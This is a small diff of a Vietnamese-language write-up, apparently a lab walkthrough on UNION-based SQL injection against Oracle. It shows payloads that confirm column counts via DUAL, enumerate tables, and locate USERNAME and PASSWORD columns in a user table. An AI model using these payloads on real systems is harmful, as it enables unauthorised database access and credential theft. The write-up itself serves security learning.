@@ -2,7 +2,7 @@ Sử dụng truy vấn **' UNION+SELECT 'tuong','trung' FROM dual--** xác đị
 Bảng DUAL là bảng một hàng một cột đặc biệt được hiển thị theo mặc định trong tất cả các cài đặt cơ sở dữ liệu của Oracle
 <br>
 Tiếp đó ta sử dụng truy vấn **' UNION+SELECT table_name,NULL FROM all_tables--** để lấy tên các bảng
-<br> Ta có 1 số bảng nghi ngờ như sau: 
+<br> Ta có 1 số bảng nghi ngờ như sau: <br>
 ![image](https://user-images.githubusercontent.com/62832067/150348055-fa7b2774-ffd9-4de8-a6c4-f61f67b42cb6.png)
 <br> Lấy tên cột của từng bảng bằng truy vấn sau và ta xác định được bảng chứa 2 cột **USERNAME** và **PASSWORD** là bảng **USERS_KWPONQ**  
 <br> ** '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_KWPONQ'--**
